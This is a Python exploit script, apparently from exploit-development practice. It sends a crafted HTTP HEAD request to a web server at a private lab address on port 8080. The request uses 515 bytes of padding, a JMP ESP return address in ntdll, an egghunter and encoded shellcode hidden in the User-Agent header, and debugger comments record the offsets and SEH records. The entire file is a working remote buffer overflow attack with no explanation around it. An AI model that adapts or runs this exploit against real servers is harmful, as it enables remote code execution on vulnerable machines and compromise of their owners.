
import socket 



#   013BFFA4   4C64644B  KddL  Pointer to next SEH record   582
#   013BFFA8   78435969  iYCx  SE handler      586

#   004015C2   . 5F             POP EDI
#   004015C3   . 5D             POP EBP
#   004015C4   . C3             RETN

#   485

#   013BFB24   53553833  38US   eip     515 
#   013BFB28   4B684C31  1LhK   esp     519

#   7C91FCD8   FFE4             JMP ESP  ntdll


pattern = 'f8FCgUuORnbmBiwMDzQamZZEzmxWxxZBhFaqtgKdPHBnPIqr9paAGOpinXQkJTiW0YU8L2LgHzeAkggarfclGw8iZmNI2cMmiZmdWbUbW9U7mT8vbslYmHvBU4rWOHkwgcnmNyp7Meh4r5iCJEoU1BV87KVi3MmBouAcSCK1HaU0Jrh2D9owKtDnzC5cdc3FNNokl7iJ7PkWajX0lcqFw585ae10twuWV7GbPJlX3iPCJfh5VixblHCvagGR9zqFLzk0Y1PFdtoQncr9D0gScDNbAp2yLeVVzdUklkmTFsve51q5FQlkQ8BHluXHMOubH5oVRwhUQOJYAeGtttdNgH9H2vZzAYpdcqCJTtFKcZnMen5zob0qjSFFZirrHuEBVR33cyGx83GjxNhyYLjx90LutT5AijGuvtaeyddPyLixHmSNRtmHSroWm4bhotdiNyLHdiARfo57w6h8dH0i5Navd4smnlMmjpKdbhuPPX302wmW2n5tsktfdqyvjW8fRtV38US1LhKRHFk73uHEyoHuunAKwQ90pKUc12YjZaDhgWatJT9VfbtAMM7ljMq3aFAUriKddLiYCxweVO0hODL263wqd4GojwO95n8zYAIgwmkL6ft9FBfh512nLLpDBbdlrhdGfoATrkfiukAZFFpNMbm8jCFFY4AGQItvHwJLa2eicbbrzp4EuBFOzRUCXYI2Q5q9hbSW8CeCYxpBZa4HzXoEJHrTIu5QzWb3ZJpSiV3mzSfarFe4a9BS7JBcG37s58Ws4R6ZzBZVVpBJGVt7NWb1FXjKr3wubqtXMWv8nIo00FJvJiQwWPpH55h5xhseNqKKi5vPZ5doty0e3GVHVUyCBFxYUSc2elnTp3md95kLmDugZ5e0NwtaS0aCaopL81CSXsLZlGvCuotIwbYC3Qo4Wzer7k3wkzO5xSdNmm2XxuIpQ31DVqkDjZZNU7yqGWcGNZXKR4HywRFeV3SKVoZzQ30PsRQvBbJ3'

shellcode = 'w00tw00t'
shellcode += ("\xbb\x83\xb3\x46\x48\xdd\xc3\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x31\x31\x58\x13\x83\xc0\x04\x03\x58\x8c\x51\xb3\xb4\x7a\x17"
"\x3c\x45\x7a\x78\xb4\xa0\x4b\xb8\xa2\xa1\xfb\x08\xa0\xe4\xf7"
"\xe3\xe4\x1c\x8c\x86\x20\x12\x25\x2c\x17\x1d\xb6\x1d\x6b\x3c"
"\x34\x5c\xb8\x9e\x05\xaf\xcd\xdf\x42\xd2\x3c\x8d\x1b\x98\x93"
"\x22\x28\xd4\x2f\xc8\x62\xf8\x37\x2d\x32\xfb\x16\xe0\x49\xa2"
"\xb8\x02\x9e\xde\xf0\x1c\xc3\xdb\x4b\x96\x37\x97\x4d\x7e\x06"
"\x58\xe1\xbf\xa7\xab\xfb\xf8\x0f\x54\x8e\xf0\x6c\xe9\x89\xc6"
"\x0f\x35\x1f\xdd\xb7\xbe\x87\x39\x46\x12\x51\xc9\x44\xdf\x15"
"\x95\x48\xde\xfa\xad\x74\x6b\xfd\x61\xfd\x2f\xda\xa5\xa6\xf4"
"\x43\xff\x02\x5a\x7b\x1f\xed\x03\xd9\x6b\x03\x57\x50\x36\x49"
"\xa6\xe6\x4c\x3f\xa8\xf8\x4e\x6f\xc1\xc9\xc5\xe0\x96\xd5\x0f"
"\x45\x68\x9c\x12\xef\xe1\x79\xc7\xb2\x6f\x7a\x3d\xf0\x89\xf9"
"\xb4\x88\x6d\xe1\xbc\x8d\x2a\xa5\x2d\xff\x23\x40\x52\xac\x44"
"\x41\x31\x33\xd7\x09\x98\xd6\x5f\xab\xe4")

junk = 'A'*515

#   7C91FCD8
eip = '\xD8\xFC\x91\x7C'

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"+\
        "\x77\x30\x30\x74" + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

esp = '\xcc'*4 
#nseh = '\xeb\x06\x90\x90'

#   004015C2 
#    80 from B's
#seh = '\xC2\x15\x40'
#shellcode = '\x90'*4
#shellcode += '\xcc'*4
#junk2 = 'B'*80

junk2 = egghunter 


req = 'HEAD /' +   junk + eip  + junk2 + ' HTTP/1.1\r\n\r\n'+\
    'User-Agent : ' + shellcode + '\r\n'
#   req = 'HEAD /' + junk2*6 + ' HTTP/1.1\r\n\r\n'
payload = req 
payload = payload.encode('raw_unicode_escape')

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.117.128',8080))

s.send(payload)

s.close()




